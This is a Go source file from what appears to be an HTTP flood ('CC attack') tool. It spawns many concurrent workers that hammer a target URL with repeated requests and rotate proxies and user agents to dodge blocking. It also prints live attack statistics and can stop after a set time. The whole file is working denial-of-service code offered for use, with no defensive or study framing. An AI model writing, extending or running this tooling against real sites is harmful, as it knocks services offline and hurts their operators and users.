package attack

import (
	"context"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/MasonDye/CC-Attack-Rewrite/pkg/config"
	"github.com/MasonDye/CC-Attack-Rewrite/pkg/httpclient"
	"github.com/MasonDye/CC-Attack-Rewrite/pkg/proxy"
	"github.com/MasonDye/CC-Attack-Rewrite/pkg/stats"
	"github.com/MasonDye/CC-Attack-Rewrite/pkg/useragent"
	"github.com/MasonDye/CC-Attack-Rewrite/pkg/version"
)

// Attacker orchestrates the CC attack.
type Attacker struct {
	cfg          *config.Config
	proxyMgr     *proxy.Manager
	userAgentMgr *useragent.Manager
	clientMgr    *httpclient.ClientManager
	stats        *stats.Stats
	stopChan     chan struct{}
	wg           sync.WaitGroup
}

// NewAttacker creates a new Attacker instance.
func NewAttacker(cfg *config.Config) (*Attacker, error) {
	proxyMgr, err := proxy.NewManager(cfg.ProxyListFile)
	if err != nil {
		return nil, fmt.Errorf("failed to create proxy manager: %w", err)
	}

	userAgentMgr, err := useragent.NewManager(cfg.UserAgentFile)
	if err != nil {
		return nil, fmt.Errorf("failed to create user agent manager: %w", err)
	}

	defaultUserAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
	if userAgentMgr.GetRandomUserAgent() != "" {
		defaultUserAgent = userAgentMgr.GetRandomUserAgent()
	}

	clientMgr := httpclient.NewClientManager(defaultUserAgent)
	stats := stats.NewStats()

	return &Attacker{
			cfg:          cfg,
			proxyMgr:     proxyMgr,
			userAgentMgr: userAgentMgr,
			clientMgr:    clientMgr,
			stats:        stats,
			stopChan:     make(chan struct{}),
		},
		nil
}

// StartAttack begins the CC attack.
func (a *Attacker) StartAttack() {
	fmt.Printf("\033[32mCC Attack ++ \033[31m|\033[34m Version: %s (Releases %s)\033[0m\n", version.Version, version.BuildDate)
	fmt.Println("\033[31mStart Attack!\033[0m")

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	for i := 0; i < a.cfg.ThreadCount; i++ {
		a.wg.Add(1)
		go a.worker(ctx)
	}

	// Goroutine to report stats periodically
	go func() {
		for {
			select {
			case <-time.After(1 * time.Second): // Report every second
				a.stats.Report(a.cfg.TargetURL, a.cfg.ThreadCount, a.cfg.RequestInterval, a.cfg.Timeout)
			case <-ctx.Done():
				return
			}
		}
	}()

	// Goroutine to stop attack after specified time
	if a.cfg.AttackTime > 0 {
		go func() {
			<-time.After(time.Duration(a.cfg.AttackTime) * time.Second)
			log.Println("Stopping attack due to attack time limit reached.")
			cancel() // Signal all goroutines to stop
		}()
	}

	a.wg.Wait()
	log.Println("Attack finished.")
}

// worker performs the attack requests.
func (a *Attacker) worker(ctx context.Context) {
	defer a.wg.Done()

	// Create client once per worker
	client := a.clientMgr.CreateClient(time.Duration(a.cfg.Timeout)*time.Millisecond, nil) // Proxy will be set per request

	for {
		select {
		case <-ctx.Done():
			return
		default:
			proxyURL := (*url.URL)(nil)
			if a.proxyMgr.HasProxies() {
				p, err := a.proxyMgr.GetRandomProxy()
				if err != nil {
					log.Printf("Worker %d: Error getting proxy: %v\n", os.Getpid(), err)
					a.stats.IncrementError()
					time.Sleep(time.Duration(a.cfg.RequestInterval) * time.Millisecond)
					continue
				}
				proxyURL = p
			}

			// Set proxy for the current request
			if transport, ok := client.Transport.(*http.Transport); ok {
				transport.Proxy = http.ProxyURL(proxyURL)
			}

			reqURL := a.cfg.TargetURL
			if !strings.HasPrefix(reqURL, "http://") && !strings.HasPrefix(reqURL, "https://") {
				reqURL = "http://" + reqURL
			}

			userAgent := a.userAgentMgr.GetRandomUserAgent()
			if userAgent == "" {
				// Fallback to default if no user agents are loaded
				userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
			}

			req, err := a.clientMgr.CreateRequest(strings.ToUpper(a.cfg.Method), reqURL, a.cfg.Cookie, userAgent, a.cfg.HTTPVersion)
			if err != nil {
				a.stats.IncrementError()
				time.Sleep(time.Duration(a.cfg.RequestInterval) * time.Millisecond)
				continue
			}

			if a.cfg.Data != "" && (a.cfg.Method == "POST" || a.cfg.Method == "PUT" || a.cfg.Method == "PATCH") {
				req.Body = io.NopCloser(strings.NewReader(a.cfg.Data))
				req.ContentLength = int64(len(a.cfg.Data))
				// 设置默认的 Content-Type header
				if req.Header.Get("Content-Type") == "" {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			}

			resp, err := client.Do(req)
			if err != nil {
				// log.Printf("Worker %d: Request to %s failed: %v\n", os.Getpid(), reqURL, err)
				a.stats.IncrementError()
				time.Sleep(time.Duration(a.cfg.RequestInterval) * time.Millisecond)
				continue
			}

			resp.Body.Close()
			a.stats.IncrementSuccess()

			time.Sleep(time.Duration(a.cfg.RequestInterval) * time.Millisecond)
		}
	}
}
